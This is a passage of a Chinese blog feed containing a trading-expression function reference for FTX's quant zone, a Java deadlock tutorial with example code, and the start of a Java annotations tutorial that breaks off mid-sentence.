align="left">函数</th><th align="right">作用</th></tr></thead><tbody><tr><td align="left"><code>position("ETH-PERP")</code></td><td align="right">当前 ETH 合约 ETH 的数量. 正直或零</td></tr><tr><td align="left"><code>position("ETH-PERP", "buy")</code></td><td align="right">当前做多合约余额, 仓位为负则此值为 0</td></tr><tr><td align="left"><code>position("ETH-PERP", "sell")</code></td><td align="right">当前做空合约余额, 仓位为正则此值为 0</td></tr><tr><td align="left"><code>position_side("ETH-PERP")</code></td><td align="right">仓位为正则为 1; 仓位为负责为 -1; 否则为 0</td></tr><tr><td align="left"><code>position_net("ETH-PERP")</code></td><td align="right">净仓位. 持多长为正, 持空仓为负</td></tr><tr><td align="left"><code>position_leverage("ETH-PERP")</code></td><td align="right">仓位杠杆的约值</td></tr><tr><td align="left"><code>position_notional("ETH-PERP")</code></td><td align="right">仓位价值(USD)</td></tr><tr><td align="left"><code>position_break_even_price("ETH-PERP")</code></td><td align="right">盈亏平衡的价格(保本价格)</td></tr><tr><td align="left"><code>position_avg_open_price("ETH-PERP")</code></td><td align="right">平均开仓价格</td></tr><tr><td align="left"><code>position_recent_pnl("ETH-PERP")</code></td><td align="right">Recent pnl(pnl since last flat) of position in USD.</td></tr></tbody></table><blockquote><p><code>pnl</code>:</p></blockquote><h3 id="钱包数据"><a href="#钱包数据" class="headerlink" title="钱包数据"></a>钱包数据</h3><table><thead><tr><th align="left">函数</th><th align="right">作用</th></tr></thead><tbody><tr><td align="left"><code>balance("ETH")</code></td><td align="right">当前现货 ETH 总余额</td></tr><tr><td align="left"><code>balance_free("ETH")</code></td><td align="right">当前现货 ETH 可用余额</td></tr></tbody></table><h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><table><thead><tr><th align="left">函数</th><th align="right">作用</th></tr></thead><tbody><tr><td align="left"><code>abs(x)</code></td><td align="right">计算 <code>x</code> 的绝对值</td></tr><tr><td align="left"><code>max(x, y)</code></td><td align="right">求 <code>x</code> 和 <code>y</code> 的更大值</td></tr><tr><td align="left"><code>min(x, y)</code></td><td align="right">求 <code>x</code> 和 <code>y</code> 的更小值</td></tr><tr><td align="left"><code>sqrt(x)</code></td><td align="right">计算 <code>x</code> 的平方根</td></tr><tr><td align="left"><code>floor(x)</code></td><td align="right">计算小于等于 <code>x</code> 的最大整数</td></tr><tr><td align="left"><code>ceil(x)</code></td><td align="right">计算大于等于等于 <code>x</code> 的最小整数</td></tr><tr><td align="left"><code>sign(x)</code></td><td align="right">如果 <code>x</code> 为正则结果为 1; 如果 <code>x</code> 为负则结果为 -1; 如果 <code>x</code> 为零则结果为 0.</td></tr></tbody></table><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><table><thead><tr><th align="left">运算符</th><th align="right">作用</th></tr></thead><tbody><tr><td align="left"><code>x and y</code></td><td align="right"><code>x</code> 和 <code>y</code> 均为 true 则为 true, 否则为 false</td></tr><tr><td align="left"><code>x or y</code></td><td align="right"><code>x</code> 和 <code>y</code> 均为 false 则为 false, 否则为 true</td></tr><tr><td align="left"><code>not x</code></td><td align="right"><code>x</code> 为 false 则为 true, 否则为 true</td></tr><tr><td align="left"><code>x if y else z</code></td><td align="right">如果 <code>y</code> 为 true 则值为 <code>x</code>, 否则值为 <code>z</code></td></tr></tbody></table><h3 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h3><table><thead><tr><th align="left">运算符</th><th align="right">作用</th><th align="left">运算符</th><th align="right">作用</th></tr></thead><tbody><tr><td align="left"><code>+</code></td><td align="right">加法</td><td align="left">-</td><td align="right">减法</td></tr><tr><td align="left"><code>*</code></td><td align="right">乘法</td><td align="left">/</td><td align="right">除法</td></tr><tr><td align="left"><code>%</code></td><td align="right">求余</td><td align="left">//</td><td align="right">除法, 下舍</td></tr><tr><td align="left"><code>x ** y</code></td><td align="right"><code>x</code> 的 <code>y</code> 次方</td><td align="left"></td><td align="right"></td></tr></tbody></table><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><table><thead><tr><th align="left">函数</th><th align="right">作用</th></tr></thead><tbody><tr><td align="left"><code>get_variable(name)</code></td><td align="right">使用<strong>设置变量(set variable)<strong>定义的值, 变量不存在则为 0<br></strong><font color="#FF6666">可以跨策略使用！！！</font></strong></td></tr><tr><td align="left"><code>perpetual("ETH")</code></td><td align="right">获取永续合约市场的名称</td></tr><tr><td align="left"><code>quarterly("ETH")</code></td><td align="right">获取季度合约市场的名称</td></tr><tr><td align="left"><code>time</code></td><td align="right">当前 Unix 时间(自 1970 年 1 月 1 日以来的秒数)</td></tr><tr><td align="left"><code>minute</code></td><td align="right">当前时间的分钟部分. 从小时开始算起的整分钟数</td></tr><tr><td align="left"><code>hour</code></td><td align="right">当前时间的小时部分. 从 UTC 午夜以来的总小时数</td></tr><tr><td align="left"><code>day_of_week()</code></td><td align="right">UTC day of the week as an integer, where Monday is 0 and Sunday is 6.</td></tr></tbody></table><h3 id="一些示例"><a href="#一些示例" class="headerlink" title="一些示例"></a>一些示例</h3><ul><li>当前价格小于 30 天均价: <code>price("ETH/USDT") &lt; average_price("ETH/USDT", 60 * 24 * 30)</code></li><li>当前现货持仓价值: <code>balance("FTT") * price("FTT/USDT")</code></li><li>当前合约持仓价值: <code>price("FTT-PERP") * position("FTT-PERP", "sell")</code></li><li>当前现货价值小于 总余额 / 2 * 95%:  <code>balance("FTT") * price("FTT/USDT") &lt; (balance("USDT") + price("FTT-PERP") * position("FTT-PERP", "sell") + balance("FTT") * price("FTT/USDT")) / 2 * 0.95</code></li></ul><h2 id="策略分享"><a href="#策略分享" class="headerlink" title="策略分享"></a>策略分享</h2><ul><li><a href="http://www.crazybunqnq.com/2021/10/07/ftxquantzonegird/">网格策略</a></li></ul><blockquote><p>欢迎留言提供你的思路~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 虚拟货币 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自动交易 </tag>
            
            <tag> FTX </tag>
            
            <tag> 量化空间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 死锁原因及排查</title>
      <link href="/2021/08/05/javadeadlock/"/>
      <url>/2021/08/05/javadeadlock/</url>
      
        <content type="html"><![CDATA[<p>在高并发多线程的应用里，很可能就会遇到死锁问题，来看看死锁的原因，遇到了要怎么解决呢？</p><h2 id="死锁的原因"><a href="#死锁的原因" class="headerlink" title="死锁的原因"></a>死锁的原因</h2><p>Java 发生死锁的根本原因是: 在申请锁时发生了交叉闭环申请</p><p>即线程在获得了锁 A 并且没有释放的情况下又去申请锁 B, 这时另一个线程已经获得了锁 B</p><p>在释放锁 B 之前又要先获得锁 A, 因此闭环发生, 陷入死锁循环, 这就是死锁了</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1"></a>示例 1</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeadLockA</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LockA 开始运行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token class-name">Client</span><span class="token punctuation">.</span>obj1<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LockA 锁住 obj1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 给 LockB 一个锁住 obj2 的机会...</span>                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LockA 尝试锁住 obj2..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token class-name">Client</span><span class="token punctuation">.</span>obj2<span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LockA 锁住 obj2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeadLockB</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LockB 开始运行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token class-name">Client</span><span class="token punctuation">.</span>obj2<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LockB 锁住 obj2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LockB 尝试锁住 obj1..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token class-name">Client</span><span class="token punctuation">.</span>obj1<span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LockB 锁住 obj1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> obj1 <span class="token operator">=</span> <span class="token string">"obj1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> obj2 <span class="token operator">=</span> <span class="token string">"obj2"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ars<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">DeadLockA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">DeadLockB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><pre class="line-numbers language-log" data-language="log"><code class="language-log">LockA 开始运行LockA 锁住 obj1LockB 开始运行LockB 锁住 obj2LockB 尝试锁住 obj1<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>LockA 尝试锁住 obj2<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两个线程最后都在等待对方释放锁, 最终进入了死锁状态</p><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2"></a>示例 2</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span> clazz<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"TestClass method in"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">method2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"TestClass method out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">method2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"TestClass method2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestLock</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">TestClass</span> class1<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">TestClass</span> class2<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">TestLock</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span> class1<span class="token punctuation">,</span> <span class="token class-name">TestClass</span> class2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>class1 <span class="token operator">=</span> class1<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>class2 <span class="token operator">=</span> class2<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        class1<span class="token punctuation">.</span><span class="token function">method</span><span class="token punctuation">(</span>class2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ars<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">TestClass</span> classA <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TestClass</span> classB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">TestLock</span><span class="token punctuation">(</span>classA<span class="token punctuation">,</span> classB<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">TestLock</span><span class="token punctuation">(</span>classB<span class="token punctuation">,</span> classA<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h4><pre class="line-numbers language-log" data-language="log"><code class="language-log">TestClass method inTestClass method in<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>结果显示进入两次方法, 但是并没有走完, 因为死锁了</p><p>一旦出现死锁, 整个程序既不会发生任何错误, 也不会给出任何提示, 只是所有线程处于阻塞状态, 无法继续</p><h2 id="如何避免死锁"><a href="#如何避免死锁" class="headerlink" title="如何避免死锁"></a>如何避免死锁</h2><p>Java 虚拟机没有提供检测, 也没有采取任何措施来处理死锁的情况, 所以多线程编程中, 应该手动采取措施避免死锁</p><p>我们知道了死锁如何产生的, 那么就知道该如何去预防</p><p>如果一个线程每次只能获取一个锁, 那么就不会出现由于嵌套持有锁顺序导致的死锁</p><h3 id="正确的顺序获得锁"><a href="#正确的顺序获得锁" class="headerlink" title="正确的顺序获得锁"></a>正确的顺序获得锁</h3><p>上面的例子出现死锁的根本原因就是获取所的顺序是乱序的, 超乎我们控制的</p><p>上面例子最理想的情况就是把业务逻辑抽离出来, 把获取锁的代码放在一个公共的方法里面, 让这两个线程获取锁都是从我的公共的方法里面获取</p><p>当 <code>Thread1</code> 线程进入公共方法时, 获取了 <code>A</code> 锁, 另外 <code>Thread2</code> 又进来了, 但是 <code>A</code> 锁已经被 <code>Thread1</code> 线程获取了, 所以只能阻塞等待</p><p><code>Thread1</code> 接着又获取锁 <code>B</code>, <code>Thread2</code> 线程就不能再获取不到了锁 <code>A</code>, 更别说再去获取锁 <code>B</code> 了，这样就有一定的顺序了</p><p>只有当 <code>Thread1</code> 释放了所有锁, 线程 <code>B</code> 才能获取</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 注解</title>
      <link href="/2021/06/01/javaannotation/"/>
      <url>/2021/06/01/javaannotation/</url>
      
        <content type="html"><![CDATA[<p>写代码的时候经常能见到各种注解，可能因为太常见，所以忽略了它的存在</p><p>今天点进去几个注解看了下源码注释, 了解下官方说明各个注解是干啥的, 结果发现每个注解类里面的方法都跳转不到实现类, 哎哟我的好奇心呐, 研究研究！</p><h2 id="为什么会有注解"><a href="#为什么会有注解" class="headerlink" title="为什么会有注解"></a>为什么会有注解</h2><p>使用 Annotation 之前(甚至在使用之后), XML 被广泛的应用于描述元数据. 不知何时开始一些应用开发人员和架构师发现 XML 的维护越来越糟糕了. 他们希望使用一些和代码紧耦合的东西, 而不是像 XML 那样和代码是松耦合的(在某些情况下甚至是完全分离的)代码描述.</p><p>如果你上网搜索 <code>XML vs. Annotations</code>, 会看到许多关于这个问题的辩论. 最有趣的是 XML 配置其实就是为了分离代码和配置而引入的. 上述两种观点可能会让你很疑惑, 两者观点似乎构成了一种循环, 但各有利弊.</p><p>我们可以通过一个例子来理解这两者的区别:</p><ul><li>假如你想为应用设置很多的常量或参数, 这种情况下, XML 是一个很好的选择, 因为它不会同特定的代码相连</li><li>如果你想把某个方法声明为服务, 那么使用 Annotation 会更好一些. 因为这种情况下需要注解和方法紧密耦合起来, 开发人员也必须认识到这点</li></ul><p>另一个很重要的因素是 Annotation 定义了一种标准的描述元数据的方式.</p><p>**Annotation(注解)**就是 Java 提供了一种元程序中的元素关联任何信息和任何元数据(metadata)的途径和方法</p><p>Annotation 是一个接口, 程序可以通过反射来获取指定程序元素的 Annotation 对象，然后通过 Annotation 对象来获取注解里面的元数据</p><h2 id="元数据-metadata"><a href="#元数据-metadata" class="headerlink" title="元数据(metadata)"></a>元数据(metadata)</h2><h2 id="注解的分类"><a href="#注解的分类" class="headerlink" title="注解的分类"></a>注解的分类</h2><ul><li>根据注解参数的个数:<ol><li>标记注解: 一个没有成员定义的 Annotation 类型被称为标记注解</li><li>单值注解: 只有一个值</li><li>完整注解: 拥有多个值</li></ol></li><li>根据注解使用方法和用途:<ol><li><a href="#%E5%86%85%E7%BD%AE%E6%B3%A8%E8%A7%A3">JDK 内置系统注解</a></li><li><a href="#%E5%85%83%E6%B3%A8%E8%A7%A3(meta-annotation)">元注解</a></li><li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E8%A7%A3">自定义注解</a></li></ol></li></ul><h2 id="内置注解"><a href="#内置注解" class="headerlink" title="内置注解"></a>内置注解</h2><p>JavaSE 中内置三个标准注解, 定义在 <code>java.lang</code> 中</p><h3 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h3><p>限定重写父类方法, 若想要重写父类的一个方法时, 需要使用该注解告知编译器我们正在重写一个方法</p><p>如此一来, 当父类的方法被删除或修改了, 编译器会提示错误信息, 或者该方法不是重写也会提示错误</p><h3 id="Deprecated"><a href="#Deprecated" class="headerlink" title="@Deprecated"></a>@Deprecated</h3><p>标记已过时, 当我们想要让编译器知道一个方法已经被弃用(deprecate)时, 应该使用这个注解</p><p>Java 推荐在 javadoc 中提供信息, 告知用户为什么这个方法被弃用了, 以及替代方法是什么</p><h3 id="SuppressWarnings"><a href="#SuppressWarnings" class="headerlink" title="@SuppressWarnings"></a>@SuppressWarnings</h3><p>抑制编译器警告, 该注解仅仅告知编译器, 忽略它们产生了特殊警告</p><p>如: 在 java 泛型中使用原始类型. 其保持性策略(retention policy)是 SOURCE, 在编译器中将被丢弃</p><h2 id="元注解-meta-annotation"><a href="#元注解-meta-annotation" class="headerlink" title="元注解(meta-annotation)"></a>元注解(meta-annotation)</h2><p>元注解的作用就是负责注解其他注解</p><p>Java5.0 定义了 4 个标准的元注解类型, 它们被用来提供对其它注解类型作说明</p><p>这些类型和它们所支持的类在 <code>java.lang.annotation</code> 包中可以找到</p><p>这里定义了一个空的注解, 它能干什么呢? 我也不知道, 但他能用…</p><p>后面我们再给这个注解添加元注解</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@interface</span> <span class="token class-name">Simple</span><span class="token punctuation">{</span>    <span class="token comment">// 这里定义了一个空的注解, 它能干什么呢? 我也不知道, 但他能用...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Target"><a href="#Target" class="headerlink" title="@Target"></a>@Target</h3><p>用于描述注解的使用范围(即: 被描述的注解可以用在什么地方)</p><p>表示支持注解的程序元素的种类, 如果 @Target 元注解不存在, 那么该注解就可以使用在任何程序元素之上</p><p>可以设置的值(ElementType):</p><ol><li><code>CONSTRUCTOR</code>: 用于描述构造器</li><li><code>FIELD</code>: 用于描述域</li><li><code>LOCAL_VARIABLE</code>: 用于描述局部变量</li><li><code>METHOD</code>: 用于描述方法</li><li><code>PACKAGE</code>: 用于描述包</li><li><code>PARAMETER</code>: 用于描述参数</li><li><code>TYPE</code>: 用于描述类、接口(包括注解类型) 或 enum 声明</li></ol><p>此时在空注解中加入 <code>@Target(ElementType.METHOD)</code> 元注解使其只能作用在方法上:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Simple</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Retention"><a href="#Retention" class="headerlink" title="@Retention"></a>@Retention</h3><p>表示需要在什么级别保存该注释信息, 用于描述注解的生命周期(即: 被描述的注解在什么范围内有效), 表示注解类型保留时间的长短</p><p>可以设置的值(ElementType):</p><ol><li><code>SOURCE</code>: 在源文件中有效(即源文件保留)</li><li><code>CLASS</code>: 在 class 文件中有效(即 class 保留)</li><li><code>RUNTIME</code>: 在运行时有效(即运行时保留)</li></ol><p>此时在上述注解中加入 <code>@Retention(RetentionPolicy.RUNTIME)</code> 元注解使其运行时有效</p><p>注解处理器可以通过反射, 获取到该注解的属性值, 从而去做一些运行时的逻辑处理</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@interface</span> <span class="token class-name">Simple</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Documented"><a href="#Documented" class="headerlink" title="@Documented"></a>@Documented</h3><p>表示使用该注解的元素应被 javadoc 或类似工具文档化, 应用于类型声明, 类型声明的注解会影响客户端对注解元素的使用</p><p>如果一个类型声明添加了 Documented 注解, 那么它的注解会成为被注解元素的公共 API 的一部分, @Documented 是一个标记注解</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Documented</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@interface</span> <span class="token class-name">Simple</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Inherited"><a href="#Inherited" class="headerlink" title="@Inherited"></a>@Inherited</h3><p>表示一个注解类型会被自动继承</p><p>如果用户在类声明的时候查询注解类型, 